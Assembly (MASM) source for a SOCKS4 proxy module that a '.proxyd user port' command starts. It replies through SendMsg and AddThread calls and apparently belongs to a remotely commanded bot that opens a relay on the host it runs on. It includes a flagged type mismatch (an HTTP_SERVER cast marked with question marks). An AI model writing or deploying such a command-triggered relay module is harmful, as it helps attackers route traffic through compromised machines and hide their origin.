ProxydProc proto :dword, :dword, :dword, :dword, :dword
ProxyClient proto :dword
Proxyd proto :dword

SOCKS4 struct
 bVn byte ?
 bCd byte ?
 wPort word ?
 dIp dword ?
SOCKS4 ends

PROXY_CLIENT struct
  dwsocket             dword ?
  bsync                byte ?
  szuser               byte 64 dup (?)
PROXY_CLIENT ends

PROXY_SERVER struct
  dwsocket             dword ?
  dwport               dword ?
  bsync                byte ?
  szuser               byte 64 dup (?)
PROXY_SERVER ends

.code
ProxydProc proc uses edx ecx esi edi dwSocket:dword, szUser:dword, szReply:dword, szCmd:dword, szArguments:dword
    local proxy:PROXY_SERVER
    local szProxyUser[64]:byte
    local szProxyPort[64]:byte

    invoke lstrcmpi, szCmd, addr szPROXYD
    .if eax == 0
        ; .proxyd user port
        
        ; get user (from arguments)
        invoke  GetToken, addr szDataBuffer, szArguments, 32, 2, FALSE
        invoke  lstrcpy, addr szProxyUser, addr szDataBuffer

        ; get port (from arguments)
        invoke  GetToken, addr szDataBuffer, szArguments, 32, 3, FALSE
        invoke  lstrcpy, addr szProxyPort, addr szDataBuffer
        
        invoke  atodw, addr szProxyPort
        mov     proxy.dwport, eax
        mov     proxy.bsync, 0
        
        
        invoke  CopyMemory, addr proxy.szuser, addr szProxyUser, 64
        invoke  CreateThread, 0, 0, addr Proxyd, addr proxy, 0, 0
      
        push    eax
        .while  proxy.bsync != 1
            invoke  Sleep, 10
        .endw
        invoke  wsprintf, addr szSendBuffer, addr szProxydThread, addr szProxyPort, addr szProxyUser
        pop     eax
      
        invoke  AddThread, eax, addr szSendBuffer, proxy.dwsocket, 0
        invoke  wsprintf, addr szSendBuffer, addr szProxyd, addr szProxyPort, addr szProxyUser
        invoke  SendMsg, dwSocket, szReply, addr szSendBuffer
        mov     eax, TRUE
        
        jmp @F
    .endif
    mov eax, FALSE
    @@:
ret
ProxydProc endp

; lpParam == PROXY_CLIENT
ProxyClient proc lpParam:dword
    local proxy:PROXY_CLIENT
    local Socks4:SOCKS4
    local dwSocket1:dword
    local dwSocket2:dword
    local SockAddrIn:sockaddr_in
    local BytesSent:dword
    local BytesReceived
    local NonBlocking:dword
    local User[64]:byte 
    local Buffer[2048]:byte  

    invoke CopyMemory, addr proxy, lpParam, sizeof proxy

    mov     eax, lpParam
    assume  eax:ptr PROXY_CLIENT
    mov     ecx, [eax].dwsocket
    mov     dwSocket1, ecx
    mov     [eax].bsync, 1
    assume  eax:nothing
    
    invoke  recv, dwSocket1, addr Socks4, sizeof SOCKS4, 0
    mov     BytesReceived, eax
    
    invoke  recv, dwSocket1, addr User, sizeof User, 0
    mov     BytesReceived, eax
    
    invoke lstrcmpi, addr User, addr proxy.szuser
    .if eax != 0
        jmp quit
    .endif  
    
    .if Socks4.bVn == 4
        .if     Socks4.bCd == 1
            invoke  socket, PF_INET, SOCK_STREAM, 0
            .if eax == INVALID_SOCKET
                jmp quit
            .endif 
        
            ; nos conectamos con los parametros que nos dieron en la estructura socks4
            mov     dwSocket2, eax
            
            mov     eax, Socks4.dIp
            mov     SockAddrIn.sin_addr, eax
            
            mov     SockAddrIn.sin_family, AF_INET
            
            mov     ax, Socks4.wPort
            mov     SockAddrIn.sin_port, ax
            
            invoke  connect, dwSocket2, addr SockAddrIn, sizeof SockAddrIn

            .if     eax == SOCKET_ERROR
                mov   Socks4.bVn, 0
                mov   Socks4.bCd, 91    ; not success
                invoke send, dwSocket1, addr Socks4, sizeof SOCKS4, 0
                mov   BytesSent, eax
                jmp   quit
            .endif
            
            mov     Socks4.bVn, 0
            mov     Socks4.bCd, 90      ; success
            invoke  send, dwSocket1, addr Socks4, sizeof SOCKS4, 0
            .if eax == SOCKET_ERROR
                jmp quit
            .endif
            
        .endif
    .endif 
   
    mov     NonBlocking, 1
    invoke  ioctlsocket, dwSocket1, FIONBIO, addr NonBlocking
    mov     NonBlocking, 1
    invoke  ioctlsocket, dwSocket2, FIONBIO, addr NonBlocking

    xor     eax, eax
    .while  eax != SOCKET_ERROR
        invoke  Sleep, 10
        
        ; recive del socket1 (el que se conecto con nosotros)
        invoke  recv, dwSocket1, addr Buffer, 2048, 0
        mov     BytesReceived, eax
        .if     eax == SOCKET_ERROR || eax == 0
            invoke  WSAGetLastError
            .if eax == WSAEWOULDBLOCK
                mov     BytesReceived, 0
            .else
                jmp     quit
            .endif  
        .endif
    
        @@:
        ; se lo reenvia al socket2 (el de la estructura socks4)
        .if BytesReceived > 0
            invoke  send, dwSocket2, addr Buffer, BytesReceived, 0
            .if eax == SOCKET_ERROR || eax == 0
                invoke  WSAGetLastError
                .if eax == WSAEWOULDBLOCK
                    invoke Sleep, 3 
                    jmp @B
                .else
                    jmp quit
                .endif  
            .endif
        .endif
        
        ; recive del socket2
        invoke  recv, dwSocket2, addr Buffer, 2048, 0
        mov     BytesReceived, eax
        .if eax == SOCKET_ERROR || eax == 0
            invoke  WSAGetLastError
            .if eax == WSAEWOULDBLOCK
                mov BytesReceived, 0
            .else
                jmp quit
            .endif  
        .endif
        
        ; se lo enviamos al que se conecto con nosotros
        @@:
        .if     BytesReceived > 0
            invoke  send, dwSocket1, addr Buffer, BytesReceived, 0
            .if eax == SOCKET_ERROR || eax == 0
                invoke  WSAGetLastError
                .if eax == WSAEWOULDBLOCK
                    invoke Sleep, 10
                    jmp @B
                .else
                    jmp quit
                .endif  
            .endif
        .endif
    .endw

quit:  
invoke closesocket, dwSocket1
invoke closesocket, dwSocket2
ret
ProxyClient endp

; lpParam == PROXY_SERVER
Proxyd proc lpParam:dword
    local proxy:PROXY_SERVER
    local client:PROXY_CLIENT
    local dwSocket1:dword
    local dwSocket2:dword
    local SockAddrIn:sockaddr_in
    local ClientSockAddrIn:sockaddr_in
    local SockAddrSize:dword
    local dwMode:dword

    invoke  CopyMemory, addr proxy, lpParam, sizeof proxy

    invoke  socket, PF_INET, SOCK_STREAM, 0
    mov     dwSocket1, eax

    mov     eax, lpParam
    
    ; ??????????????????????
    assume  eax:ptr HTTP_SERVER
    
    mov     ecx, dwSocket1
    mov     [eax].dwsocket, ecx
    mov     [eax].bsync, 1
    assume eax:nothing

    mov     SockAddrIn.sin_family, AF_INET
    mov     eax, proxy.dwport
    invoke  htons, eax
    mov     SockAddrIn.sin_port, ax
    xor     eax, eax
    mov     SockAddrIn.sin_addr, eax
    invoke  bind, dwSocket1, addr SockAddrIn, sizeof SockAddrIn
    mov     dwMode, 1
    invoke  ioctlsocket, dwSocket1, FIONBIO, addr dwMode
    invoke  listen, dwSocket1, SOMAXCONN
    
    @@:
        invoke  accept, dwSocket1, addr ClientSockAddrIn, 0
        .if     eax == INVALID_SOCKET
            invoke Sleep, 100
            jmp @B
        .endif

        mov     client.dwsocket, eax
        invoke  CopyMemory, addr client.szuser, addr proxy.szuser, 64
        invoke  CreateThread, 0, 0, addr ProxyClient, addr client, 0, 0
        
        push    eax
        .while  client.bsync != 1
            invoke Sleep, 10
        .endw
        pop     eax
        
        invoke  CloseHandle, eax
        invoke  Sleep, 1000
    jmp @B
    
    ret
Proxyd endp